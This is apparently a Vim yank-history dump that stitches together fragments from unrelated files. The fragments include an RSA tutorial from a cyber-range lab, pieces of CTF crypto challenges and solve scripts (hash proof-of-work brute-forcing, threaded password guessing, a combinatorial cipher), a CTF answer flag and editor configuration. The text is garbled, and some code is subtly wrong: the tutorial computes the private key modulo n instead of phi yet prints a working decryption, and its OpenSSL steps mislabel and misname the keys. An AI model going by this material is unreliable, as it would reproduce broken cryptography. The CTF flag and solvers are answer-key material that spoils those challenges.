	n = 848780836124450817787284199737402361939094963246941438729271
	e = 65537
	Ciphertext = 315593482826121462780660588900391342674466247486949323481037
	
	Answer: f4ctor_th3_modulus
	
	Challenge:
	
	A server running, to get the flag you have to forge a signature for a certain message.
	A function gives a hint which you can use to deduce the private key (e.g. d mixed with something else, you can calculate what d is)
6aaeeadc0fa1197b1e7c3fe26c0054c1|file:///home/neo/cyberranges/work/rsa/rsa102.md|7|1|V|vimwiki
	RSA is one of the most popular public key cryptosystems and is used by millions of applications to safely exchange data. Chances are, you have already used RSA today without knowing it, the moment you tried to connect to a website. In this scenario, we will take a brief look at the basics of RSA.
0b34983f67c62fab686983caddbd3f8a|file:///home/neo/cyberranges/work/rsa/rsa102.md|9|3|v|vimwiki
	What is RSA and what are its general purposes
260ffd127470a98d97c65dcdb7475086|file:///home/neo/cyberranges/work/rsa/rsa102.md|10|11|v|vimwiki
	keys are generated
8640087cc21fdef32eb627d32d7e8328|file:///home/neo/cyberranges/work/rsa/rsa102.md|11|36|V|vimwiki
	- How RSA encrypts and decrypts data
	- Some useful Python libraries and commands you can use when working with RSA
68c07a2e32ad5f5116a1dae2d4420919|file:///home/neo/cyberranges/work/rsa/rsa102.md|14|46|V|vimwiki
	- Basic knowledge of what encryption is/why it is used.
	- Optional: Basic knowledge of Python
812cfb7d3f503e6551eee861b0634a64|file:///home/neo/cyberranges/work/rsa/rsa102.md|17|1|V|vimwiki
	- https://en.wikipedia.org/wiki/RSA_(cryptosystem)
	- Modular arithmetic: https://crypto.stanford.edu/pbc/notes/numbertheory/arith.html
	- Totient function: https://crypto.stanford.edu/pbc/notes/numbertheory/units.html
	- More details about the mathematics behind RSA: https://certauth.epfl.ch/rsa/rsa.html
a6a68849d1bb4d6383de8220b19def4f|file:///home/neo/cyberranges/work/rsa/rsa102.md|24|1|V|vimwiki
	RSA is one of the most famous and widely used public key cryptosystems. It takes its name from its creators, Rivest, Shamir and Adleman, who created RSA in 1977. It is an [asymmetric encryption](https://en.wikipedia.org/wiki/Public-key_cryptography) scheme, which means that users create a key pair to perform encryption: a public key, which can be seen by anyone, and a private key, which the user has to protect and keep secret.
	RSA has two main purposes:
	    - Public key encryption: user A shares their public key with user B, whom they want to communicate with. User B encrypts a message with A's public key and sends it back to A. A decrypts the message using their private key, and is the only person who can do so because nobody else has access to A's private key. Using public key encryption, user B can safely send a message to A and make sure that a man-in-the-middle cannot decrypt the message.
	    - Digital signatures: user A uses their private key to encrypt a message (called "signing"). Anyone who knows A's public key can decrypt the message and make sure that it was signed by A, since A is the only person with access to the private key. Digital signatures are used for verifying the authenticity of a message.
	
	In this scenario, we will mostly look at how RSA is used for public key encryption.
	
	<h3>Key generation</h3>
	To create an RSA key pair, the following process is followed:
	1. Choose two distinct prime numbers, `p` and `q`. The security of RSA depends on how large these two numbers are. For most modern cryptosystems, it is recommended that the product of `p` and `q` has a size of at least 2048 bits.
	2. Calculate `n = p * q`. N is called the **public modulus**.
	3. Calculate `phi(n) = (p - 1) * (q - 1)`. `Phi(n)` is also known as **Euler's totient function**.
	4. Choose an integer `e`, such that `1 < e < phi(n)` and `e` is coprime to `phi(n)` (`gcd(e, phi(n)) == 1`). Usually, the number 65537 (or 0x10001 in hex) is used, but any number that fits the criteria can be used. `e` and `n` are the RSA public key.
	5. Calculate the modular multiplicative inverse `d` of `e (mod phi(n))`. `d` is the RSA private key. 
	 
	**Note:** Do not try to create RSA keys yourself for public usage. Finding good candidates for the prime factors is not as easy as it seems, and there exist many cryptographic libraries that can be used to create secure RSA keys.
	
	<h3>RSA encryption and decryption</h3>
	To encrypt a message using the RSA public key, we need to encode the message into a number a take that number to the power of `e` `(mod n)`. For extra security, some padding needs to be added to the message before encrypting, but this will not be covered in this scenario. 
	
	To decrypt a message using the private key, we take the ciphertext to the power of `d` `(mod n)`. 
	
	To sum up:
	- `C = M ** e (mod n)`
	- `D = M = C ** d (mod n)`
	where `a ** b` means a to the power b, `M` is the original plaintext, `C` is the ciphertext and `D` is the decrypted plaintext.
	
	If you want to learn more about the mathematics behind RSA, such as modular arithmetic, modular division, modular multiplicative inverses and why this process is followed to create RSA keys, you can check out the links in **Further Reading**, in the **Mission** tab.
	
	<h3>Attacks on RSA</h3>
	What many of the attacks on RSA are trying to achieve is to factor the public modulus N, which is part of the public key, to deduce the prime numbers p and q. If an attacker can successfully factor N, he can use p and q to calculate the totient and find the private key (think about how he could do that).
	Usually, the modulus is extremely large and impossible to be factored. However, if the modulus used is relatively small, a number of techniques can be used to find its prime factor, like looking for the factors in a public database such as http://factordb.com/ .
	There exist many more real-life attacks on the RSA cryptosystem, but are fairly advanced and outside the scope of this scenario.
	
	<h3>Python commands</h3>
	Python can be very useful when we need to quickly perform the mathematical operations required for RSA. Here are some commands and libraries that you can use:
	- Modular exponentiation: to quickly perform the operation `a ** b (mod c)` in python, we can type `pow(a, b, c)`.
	- PyCryptodome library: this library has many cryptographic features, such as transforming a message from bytes to a number and vice versa, calculating the modular inverse of a number and generating prime numbers. Install using `pip install pycryptodome`. 
	Usage example:
	```
	from Crypto.Util.number import bytes_to_long, getPrime, long_to_bytes, inverse // pip install pycryptdome
	
	# Generate p and q and calculate n
	p = getPrime(512)
	q = getPrime(512)
	print("p =", p)
	print("q =", q)
	n = p * q
	print("n =", n)
	
	# Calculate phi and the private key. We will use the value 65537 for the public key
	phi = (p - 1) * (q - 1)
	print("Phi =", phi)
	e = 0x10001
	d = inverse(e, n)
	print("Private key =", d)
	
	# Encode the message into a number
	message = b'this is a secret message'
	encoded_message = bytes_to_long(message)
	print("Encoded message =", encoded_message)
	
	# Calculate the ciphertext 
	ct = pow(encoded_message, e, n)
	print("Ciphertext =", ct)
	
	# Decrypt the ciphertext
	pt = pow(ct, d, n)
	print("Encoded plaintext =", pt)
	
	decoded_plaintext = long_to_bytes(pt)
	print("Decoded plaintext =", decoded_plaintext)
	```
	
	Output: 
	```
	p = 11116188838939060770257745148147358293555735818304945031904314986499619902861389131692960923447811615331917485192156658652749983632634958762152049925477127
	q = 8487919438101303814483748529639602760583915398820568411450788370335198224694701358911154306675934195405262897926286524061449821386207216748726261969771421
	n = 94353315323635617541240165888647973131580886363736711150034510403551383595554194270085212846289841620190673774317987642238558119413513866259612517926688249180917649510307357714930688300002045540200706405560862400711282352622769221148919201338634464926982406154738750208997601178234277584844414025044553787467
	Encoded message = 2854312398284457058259928330243763178290112970307720537957
	Phi = 94353315323635617541240165888647973131580886363736711150034510403551383595554194270085212846289841620190673774317987642238558119413513866259612517926688229576809372469942772973437010513040991400549489280047419045607925517804641665058428597223404341181171668974355631765814886978429258742668903146732658538920
	Private key = 56359754565731777772661683843369428020537970283674886421264338904249904841771213865313118197258166072685724190048770346990445621567676691372279036868884204697245166914580309345730482789172767907553150996322936865868340940926473705876715508727964504695352660715917724594295670850734244655679380372692423879993
	Ciphertext = 55402716640539776765787939267081758049797109446586641906031456198908490643519879691630161631432298803486529306454827065311910870920857603439788882356615634997987462625006116717347353807450667705858828141688203476298594018478551675262034713260793859960587135818308433581159102898830859373015660757370947721421
	Encoded plaintext = 2854312398284457058259928330243763178290112970307720537957
	Decoded plaintext = b'this is a secret message'
	```
	Find more examples and features of the PyCryptodome library here: https://pycryptodome.readthedocs.io/en/latest/src/introduction.html .
	
	<h2>Practical usage</h2>
	In real life, RSA public key encryption is usually used to encrypt and exchange keys for a symmetric encryption algorithm, such as AES. The reason for this is that asymmetric encryption algorithms such as RSA are relatively slow and cannot encrypt large messages, and thus are not suitable for exchanging bulk encrypted data. On the other hand, asymmetric encryption is the perfect candidate for exchanging a secret key, since such keys are small (usually 128 - 256 bytes long). Also, two parties can safely exchange such a key, since the only requirement is to know the public key of the other party.
	
	Let's take a look at an example of encrypting/decrypting a secret key using an RSA key pair. We will use the OpenSSL https://www.openssl.org/ command line tool for the example.
	
	First, let's create a 2048 RSA private key:
	
	openssl genrsa -out rsa.private 2048
	
	Next, let's use the generated public key to create the corresponding private key:
	
	openssl rsa -in private_key -out public_key -pubout -outform PEM
	
	Now, let's create a random 32-byte secret:
	openssl rand -hex -out secret_file 32
	
	We can now use the RSA public key to encrypt the secret:
	openssl rsautl -encrypt -pubin -inkey public_key -in secret_file -out secret_file.enc
	
	Finally, we can use the private key to decrypt the encrypted secret and get the original key:
	openssl rsautl -decrypt -inkey private_key -in secret_file.enc -out secret_file.dec
	
42cc75cf31b67522ecd610ebb73c17c8|file:///home/neo/Videos/presentation/final.txt|1|1|V|text
	file './slide1-new.mp4'
dc0db79c083ff5f86be73f33b22780cf|file:///home/neo/Videos/presentation/final.txt|2|1|V|text
	file './slide2-new.mp4'
207279dd670021f05cb3cd8fe3434a2e|file:///home/neo/Videos/presentation/final.txt|3|1|V|text
	file 'new/slide3-new.mp4'
05af84b175329429bbb266245468a952|file:///home/neo/Videos/presentation/final.txt|20|1|V|text
	file 'new/slide22-new.mp4'
	file 'new/slide23-new.mp4'
f1ee8bc154f52cc224384890873d1e42|file:///home/neo/warzone-rpisec/lab09/9A.py|10|1|V|python
	# bin_name = '/levels/lab09/lab9C'
591b3f6e51b49135c3781bda4a9ca88e|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|19|13|v|python
	jh2i
e7beb1dcf073b1d1e700fb02eccaf064|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|19|31|v|python
	50005
203d654ea1856d57baf21e8cf3ad6855|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|21|26|V|python
	    r.recvuntil('of the ')
	    hash_type = r.recvuntil(' ').decode()[:-1]
030ed52b1cf906ce4e5b2628754c5e4d|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|25|5|V|python
	    print(hash_type)
0b1e765a7b8b0b5f7dd5a98bba1d2896|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|23|5|v|python
	hash_val
a65766ae631f17adb8f40951293b3667|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|25|5|V|python
	    target = r.recvline().decode().split(' ')[-1][:-1]
82906899bc21e1b73132bc6e37c43183|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|11|22|v|python
	m5sum
45cd6ca3afed832102662ed4fbca343a|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|14|22|v|python
	sha1sum
32adff345aace6ba4b2ed53c91f32ed7|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|4|1|V|python
	from multiprocessing.dummy import Pool as ThreadPool
9ae469144d8b9a78d7f2c7126c5718cd|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|11|1|V|python
	    pool = ThreadPool(len(alphabet))
	    results = pool.map(tryPassword, alphabet)
	    pool.close() 
	    pool.join()
cca4d809199f9b082ce00933dc1ca339|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|34|24|v|python
	tryPassword
68dec747b336ffcd85943aeb3a962ecc|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|14|1|V|python
	    if hash_type == 'sha384':
	        if hashlib.sha384(tohash).hexdigest()[-6:] == target:
	            return p
23b1f23465cc48415b07c3da88c88103|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|17|22|v|python
	sha384
ad5ea2a7fc2122a1433a15b68165f638|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|39|19|v|python
	len(alphabet)
99d2ab29e0886dbd6d3411dcef2eb51b|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|39|19|v|python
	len(alphabet))
6b517cb66fa2a755d197403e5fbfb5c4|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|40|11|v|python
	pool.map(tryPassword, alphabet)
e13b2beb6e0321f79fcb25af11ed7d08|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|44|41|v|python
	pool.imap_unordered(check, possible, chunksize=100000):
508296ead2412d349b079cd64483ebaf|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|41|13|V|python
	pool.close() 
	pool.join()
a3d6308e29ab6b2d5a67d545cde01e42|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|51|1|V|python
	pool.terminate()
18852ea8ad0e399d06d4db4724851593|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|41|1|V|python
	pool = mp.Pool(16)
5060e241b4ebe6c74b74343335e9ca0c|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|39|1|V|python
	results = pool.map(tryPassword, alphabet)
f9e8222a9fc0ed07ccff8729202f6730|file:///home/neo/CTFs/hacktivitycon2020/hash.py|27|1|V|python
	    possible = list(map(''.join, it.product(possible, repeat=4)))
	    pool = mp.Pool(32)
	    for c in pool.imap_unordered(check, possible, chunksize=100000):
	        if c:
	            log.info('Solved - %s' % (c))
	            r.sendline(c)
	            print(r.recvline())
	            break
	    pool.terminate()
3b964554ab76fc26159f9b6543035f37|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|49|1|V|python
	for c in pool.map(check, possible):
	    if c:
	        log.info('Solved - %s' % (c))
	        r.sendline(c)
	        print(r.recvline())
	        break
	pool.close() 
	pool.join()
77ecfdc032d75fe8e5fcb39548ab0471|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|38|1|V|python
	pool = ThreadPool(16)
e1fb9df63e66690ae2ad418038114be4|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|38|1|V|python
	possible = list(map(''.join, it.product(possible, repeat=4)))
f38ef44656fcc0dbfd15ce2e714c3a68|file:///home/neo/CTFs/cryptoctf2020/butterfly/hash.py|29|1|V|python
	r.recvuntil('string')
4505198e0fd8a01171e81d3fdb21a5fc|file:///home/neo/CTFs/cryptoctf2020/heaven/magic.py|5|1|V|python
	def matthew_effect(shire, rohan):
	  gandalf = ''
	  for every, hobbit in enumerate(shire):
	    gandalf += oh if ord(hobbit) ^ ord(rohan[every]) == 0 else no
	  return gandalf
a6c94e120ae67b4cd5e69c41cd10e304|list:/extensions|4|1|V|list
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-snippets	2.1.28	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-python	1.2.12	~/.config/coc/extensions/node_modules/coc-python
	* coc-prettier	1.1.16	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-lists	1.3.8	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-tsserver	1.5.2	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-sh	0.5.1	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-json	1.2.6	~/.config/coc/extensions/node_modules/coc-json
	+ coc-java	1.4.11	~/.config/coc/extensions/node_modules/coc-java
	+ coc-go	0.8.0	~/.config/coc/extensions/node_modules/coc-go
04e492c2c707bf904e17a7de96a14113|file:///home/neo/.profile|39|1|V|sh
	# Nodejs
	VERSION=v12.18.3
	DISTRO=linux-x64
	export PATH=/usr/local/lib/nodejs/node-$VERSION-$DISTRO/bin:$PATH
1d549cc2a0a8119272a8e0af3624e09f|file:///home/neo/.vimrc|167|1|V|vim
	nmap <leader>rn <Plug>(coc-rename)
b67689720c56edec3abd779b602e2064|file:///home/neo/.vimrc|303|1|V|vim
	source ~/.vim/python_ropevim.vim
16dcd821c3805172fb6eec7748af8366|file:///home/neo/.vimrc|168|1|V|vim
	nmap <leader>rn :call RopeRename()
ae1863c7a25cc58a8db037f50fb70813|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|2|1|V|python
	s = s[::-1]
a6ab2ebb2bc2ce029464d309e93f55b7|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|3|1|V|python
	print(len(s)/6)
	s2 = int(s,2)
171de3aa6d5f88b9a86a7c9e67ec6540|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|6|1|V|python
	print(long_to_bytes(s2))
d9fb854fa3cfa0e29c1ba6d9e886e724|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|4|29|V|python
	s2 = ('1' + s + '0').encode()
	print(binascii.b2a_uu(s2))
1475be71363f3556ecbdd47e6f07bf3c|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|6|1|V|python
	print(long_to_bytes(int(s,2)))
4007170702e6c333e08486bee5cb4fae|file:///home/neo/.sage/ipython-5.0.0/Sage_crash_report.txt|424|1|V|text
	TypeError: gmpy2.mpz is not a type object
1a70ca1b2f12ebde74f846d2c539cc1f|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|4|1|V|python
	print(bits)
22afac02da551a1787d6431c494739b0|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|7|15|V|python
	for c in combs:
	    print(c)
e53a42415e96eb5c7e098447d1531512|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|10|9|V|python
	        print(a, b)
bfa4e89e95bdf3b84dc5f59937ab9976|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|12|1|V|python
	'hello'
a10c1ae36ccda8065277a4c38a427e77|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|10|18|v|python
	0b110100001100101011011000110110001101111
89d941a299e4badd7c8a7afd7bdb3204|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|13|13|V|python
	            print(n)
5d990b4c892f0a62e7f219c7f90dc66a|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|12|13|V|python
	            print(s)
3b19e72ce02cd77f0b29b14b6d97a89e|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|7|1|V|python
	print(int(bits,2).to_bytes())
56eaac0dcc03cdf300d80447e690fee7|file:///home/neo/CTFs/cryptoctf2020/trailing_bits/solve.py|8|1|V|python
	reap = 8
03a9082833b23d7653d9ae22a598dfd4|file:///home/neo/CTFs/cryptoctf2020/three_ravens/output.txt|1|11|v|text
	1118073551150541760383506765868334289095849217207383428775992128374826037924363098550311115755885268424829560194236035782255428423619054826556807583363177501160213010458887123857150164238253637312857212126083296001975671629067724687807682085295986049189947830021121209617616433866087257702543240938795900959368763108186758449391390546819577861156371516299606594152091361928029030465815445679749601118940372981318726596366101388122993777320367839724909505255914071
5d5f196018e48da0d005238c56460962|file:///home/neo/CTFs/cryptoctf2020/three_ravens/solve.py|5|1|V|python
	i = 2**1023
633597befba036eba7be363e40ea9ce0|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|27|1|V|python
		i, z = 0, [0 for i in range(n - 1)]
e43c31890a941ed47240bc513a0b8b21|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|16|1|V|python
	def encrypt(msg, n, k):
		msg = bytes_to_long(msg.encode('utf-8'))
		if msg >= comb(n, k):
			return -1
		m = ['1'] + ['0' for i in range(n - 1)]
		for i in range(1, n + 1):
			if msg >= comb(n - i, k):
				m[i-1]= '1'
				msg -= comb(n - i, k)
				k -= 1
		m = int(''.join(m), 2)
		i, z = 0, [0 for i in range(n - 1)]
		c = 0
		while (m > 0):
			if m % 4 == 1:
				c += 3 ** i 
				m -= 1
			elif m % 4 == 3:
				c += 2 * 3 ** i
				m += 1
			m //= 2
			i += 1
		return c
3500c57f0781e04e1757f6d980c3a5c0|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|8|1|V|python
	def comb(n, k):
		if k > n :
			return 0
		k = min(k, n - k)
		u = reduce(operator.mul, range(n, n - k, -1), 1)
		d = reduce(operator.mul, range(1, k + 1), 1)
		return u // d 
669ce3fb0d5d5d9b415b8a3689180046|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|4|1|V|python
	from functools import reduce
	import operator
4e82a9119cc83dda5fdc38c64e8eef47|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|29|1|V|python
		while (m > 0):
			if m % 4 == 1:
				c += 3 ** i 
				m -= 1
			elif m % 4 == 3:
				c += 2 * 3 ** i
				m += 1
			m //= 2
			i += 1
6a6187f8eb84e37cd1372c89133536dc|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|3|1|V|python
	from Crypto.Util.number import *
	from functools import reduce
	import operator
	from secret import flag, n, k
	
	def comb(n, k):
		if k > n :
			return 0
		k = min(k, n - k)
		u = reduce(operator.mul, range(n, n - k, -1), 1)
		d = reduce(operator.mul, range(1, k + 1), 1)
		return u // d 
	
	def encrypt(msg, n, k):
		msg = bytes_to_long(msg.encode('utf-8'))
		if msg >= comb(n, k):
			return -1
		m = ['1'] + ['0' for i in range(n - 1)]
		for i in range(1, n + 1):
			if msg >= comb(n - i, k):
				m[i-1]= '1'
				msg -= comb(n - i, k)
				k -= 1
		m = int(''.join(m), 2)
		i, z = 0, [0 for i in range(n - 1)]
		c = 0
		while (m > 0):
			if m % 4 == 1:
				c += 3 ** i 
				m -= 1
			elif m % 4 == 3:
				c += 2 * 3 ** i
				m += 1
			m //= 2
			i += 1
		return c
bfd7178d376b0ae09295c0e6dacd2f9a|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|3|1|V|python
	from Crypto.Util.number import *
	from functools import reduce
	import operator
	# from secret import flag, n, k
	
	def comb(n, k):
		if k > n :
			return 0
		k = min(k, n - k)
		u = reduce(operator.mul, range(n, n - k, -1), 1)
		d = reduce(operator.mul, range(1, k + 1), 1)
		return u // d 
	
	def encrypt(msg, n, k):
		msg = bytes_to_long(msg.encode('utf-8'))
		if msg >= comb(n, k):
			return -1
		m = ['1'] + ['0' for i in range(n - 1)]
		for i in range(1, n + 1):
			if msg >= comb(n - i, k):
				m[i-1]= '1'
				msg -= comb(n - i, k)
				k -= 1
		m = int(''.join(m), 2)
		i, z = 0, [0 for i in range(n - 1)]
		c = 0
		while (m > 0):
			if m % 4 == 1:
				c += 3 ** i 
				m -= 1
			elif m % 4 == 3:
				c += 2 * 3 ** i
				m += 1
			m //= 2
			i += 1
		return c
8c71f660b390759dc46fc641a557f9e9|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|18|9|V|python
	        print(msg)
6a496d1cb2a1d791e71ca422c4647ecf|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|19|5|V|python
	    print(comb(n,k))
cf7b8474cb4325fd808c190d80fdd895|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|28|5|V|python
	    print(int(''.join(m), 2))
c2f06d1f5ecc03e7074eb5b7a481b71e|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|34|1|V|python
	            print('%1')
bda4342709f4ff4f744ac2855005cce7|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|34|1|V|python
	        print(m2[len(m2) - 1 -i])
225999f4d104c239f7a7205c50230227|file:///home/neo/CTFs/cryptoctf2020/amsterdam/output.txt|1|7|v|text
	5550332817876280162274999855997378479609235817133438293571677699650886802393479724923012712512679874728166741238894341948016359931375508700911359897203801700186950730629587624939700035031277025534500760060328480444149259318830785583493
474da54290f381f3f6b3806ee07a21a2|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|2|1|V|python
	f = open()
239308d7645241d8add026be890c9b58|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|34|1|V|python
	        print(m2[i])
2d018a5837c322661da7b30fb43d4a6b|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|6|1|V|python
	for i in range(100, 0, -1):
ed02a178f0cb93c36ffda6ebec66bce8|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|12|1|V|python
	        c -= s
94ed734db87fb560b38b92750b2da65a|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|33|1|V|python
	print(int(pt,2))
3825377894535265720a007aac297113|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|33|1|V|python
	print(pt - m)
fdd6d39f091bf2c6102753be97d52925|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|35|1|V|python
	print(bin(pt - m)[2:])
262a62292c60ea6962bfdf607d4f5690|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|14|1|V|python
	        test += (2 ** i) - 1
2484a9d800923412f019da94429ae606|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|36|1|V|python
	print(arr)
b8bbded29aae811efaf95e1cb6098357|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|39|13|V|python
	# print(len(bin(pt - m)[2:]))
	# print(bin(pt - m)[2:])
	# for i in arr:
	#     pt -= 2**(i+1)
	# print(pt)
6d2e9f29e42705274475e97b55765613|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|38|1|V|python
	pt = int(pt,2)
b479af5cfeb6ed29dd624d4fb8040c57|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|6|1|V|python
	# c = int(bin(c)[2:][::-1],2)
d843ee8978555167dad7caa772d2d729|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|4|1|V|python
	# print(bin(m)[2:])
b71048e9d96ebc430fa6d26b5aa4c33c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|12|9|V|python
	        pt += '11'
824fcd968a4b914f30b69704c2dc48ca|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|12|9|V|python
	        arr.append(i)
2ec1b54f84922527b5cef5e727eaaa5c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|18|9|V|python
	            pt += '1'
34fccdda9d9ca932820ada57a932e33c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|19|13|V|python
	        else:
	            pt += '0'
4b17add7b35ca0ce1f431bbdea583d7e|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|22|1|V|python
	if c == 1:
	    pt += '1'
	else:
	    pt += '0'
de8846d56595e72195511997d826f2ef|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|22|1|V|python
	pt = pt[pt.index('1'):]
7ffaf5f6a478b55ce2c8519601c6f0d9|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|22|1|V|python
	# print(pt)
57c7412be4d8f6252632a360361ffc89|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|24|1|V|python
	print(m)
87efeac627056ce94f90218e7842d1df|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|25|1|V|python
	print(pt.bit_length())
0c4be1f979158ced58d16465c42b2fdc|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|8|1|V|python
	def comb(n, k):
	    if k > n :
	        return 0
	    k = min(k, n - k)
	    u = reduce(operator.mul, range(n, n - k, -1), 1)
	    d = reduce(operator.mul, range(1, k + 1), 1)
	    return u // d 
8cbd58ad5156e6804ceb957b1fda5215|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|22|1|V|python
	    for i in range(1, n + 1):
3ed26abca6a8b9b3835fceaaf6d8e032|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|37|5|V|python
	    test = 0
581df8a929e40da1a44af20558665a9c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|34|1|V|python
	n = pt.bit_length()
6d8cea6ef1df83ae6ca29791036b1326|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|41|13|V|python
	            print('a')
47264068277a949df5f6826101596e08|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|42|8|v|python
	k ==
596a8455873f0e84ebadf0af72b3174c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/amsterdam.py|3|1|V|python
	from Crypto.Util.number import *
	from functools import reduce
	import operator
e60bd8c38711a8f52fcd9d667cbf7ebe|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|41|1|V|python
	for k in range(n, 0, -1):
083f69e73e87a1789eff69fec5d16406|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|45|1|V|python
	if test == msg:
	    print(k)
32bb9012e4b1b317960022e1bcb5190c|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|42|1|V|python
	k = 30
e6b3039b2463fa6e61b478da697dbd3e|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|41|1|V|python
	test = 0
e377281c75a47a9daf9e579d403a5fc1|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|47|5|V|python
	print(test)
	print(msg)
23234257bb8d1208ee033c697ea16208|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|48|1|V|python
	    if b'CCTF' in flag:
8bc9dd34c4fb53e0ec8cedf2949eb8ad|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|49|10|v|python
	CiTF
0b2ce900ede1ef4e3639dbc9002063fd|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|49|1|V|python
	    if b'flag' in flag:
a334c2810ad6b765047307cb352ca736|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|21|1|V|python
	arr = []
317dd0ae575c97a7e1f3bc674722d852|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|44|5|V|python
	    print(kappa)
1d9ac94e3e3f096569de8eccd501508d|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|43|20|v|python
	100, n, 1
0468c9cb30b13e2fcbb7814dd4b2e813|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|47|5|V|python
	    # for i in range(n , 1, -1):
b018cb14b9d38aa0e9f5e83962d75ea6|file:///home/neo/CTFs/cryptoctf2020/amsterdam/solve.py|7|1|V|python
	# c = 3241010894369461336652756481858976188000310
	# m = 766572979821145873405458601
	# msg = 549665952574415004854141
